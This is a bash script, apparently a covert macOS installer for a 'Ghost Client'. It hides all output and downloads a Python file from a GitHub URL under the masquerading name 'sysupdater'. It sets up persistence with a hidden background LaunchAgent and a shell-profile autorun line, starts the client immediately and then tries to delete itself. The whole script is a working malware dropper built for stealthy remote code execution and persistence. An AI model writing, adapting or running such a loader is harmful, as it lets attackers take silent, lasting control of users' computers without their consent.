#!/bin/bash
# ============================================================
# SDF Ghost Client - macOS Silent Installer (FIXED)
# ============================================================

# Hide all output
exec >/dev/null 2>&1

# Set variables
CLIENT_URL="https://raw.githubusercontent.com/glitech01x/OsinToolKit/refs/heads/main/OsinTool.py"
CLIENT_NAME="sysupdater"
INSTALL_DIR="$HOME/Library/Application Support/sysupdater"
CLIENT_FILE="$INSTALL_DIR/$CLIENT_NAME.py"
LAUNCH_AGENT="$HOME/Library/LaunchAgents/com.sysupdater.plist"
INSTALL_FLAG="$INSTALL_DIR/.installed"
BIN_DIR="$HOME/.local/bin"
BIN_FILE="$BIN_DIR/$CLIENT_NAME"

# Create directories
mkdir -p "$INSTALL_DIR" 2>/dev/null
mkdir -p "$BIN_DIR" 2>/dev/null
mkdir -p "$HOME/Library/LaunchAgents" 2>/dev/null

# Download client
if command -v curl >/dev/null 2>&1; then
    curl -sSL -o "$CLIENT_FILE" "$CLIENT_URL"
elif command -v wget >/dev/null 2>&1; then
    wget -q -O "$CLIENT_FILE" "$CLIENT_URL"
else
    python3 -c "import urllib.request; urllib.request.urlretrieve('$CLIENT_URL', '$CLIENT_FILE')" 2>/dev/null
fi

# Make executable
chmod +x "$CLIENT_FILE" 2>/dev/null

# Create symlink
ln -sf "$CLIENT_FILE" "$BIN_FILE" 2>/dev/null

# Create LaunchAgent plist
cat > "$LAUNCH_AGENT" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sysupdater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/Users/$USER/Library/Application Support/sysupdater/sysupdater.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ProcessType</key>
    <string>Background</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PYTHONUNBUFFERED</key>
        <string>1</string>
    </dict>
</dict>
</plist>
EOF

# Fix the plist with actual username
sed -i '' "s/\$USER/$USER/g" "$LAUNCH_AGENT" 2>/dev/null

# Load LaunchAgent
launchctl unload "$LAUNCH_AGENT" 2>/dev/null
launchctl load "$LAUNCH_AGENT" 2>/dev/null
launchctl start com.sysupdater 2>/dev/null

# Add to .zshrc (macOS default shell)
SHELL_RC="$HOME/.zshrc"
if [ ! -f "$SHELL_RC" ]; then
    SHELL_RC="$HOME/.bash_profile"
fi
if ! grep -q "$CLIENT_NAME" "$SHELL_RC" 2>/dev/null; then
    echo "# $CLIENT_NAME" >> "$SHELL_RC"
    echo "$CLIENT_FILE &" >> "$SHELL_RC"
fi

# Create installation flag
echo "installed" > "$INSTALL_FLAG" 2>/dev/null

# Run client immediately
nohup python3 "$CLIENT_FILE" >/dev/null 2>&1 &

# Clean up self
cat > /tmp/cleanup.sh << 'EOF'
#!/bin/bash
sleep 1
rm -f "$0" 2>/dev/null
exit 0
EOF
chmod +x /tmp/cleanup.sh
/tmp/cleanup.sh &

exit 0
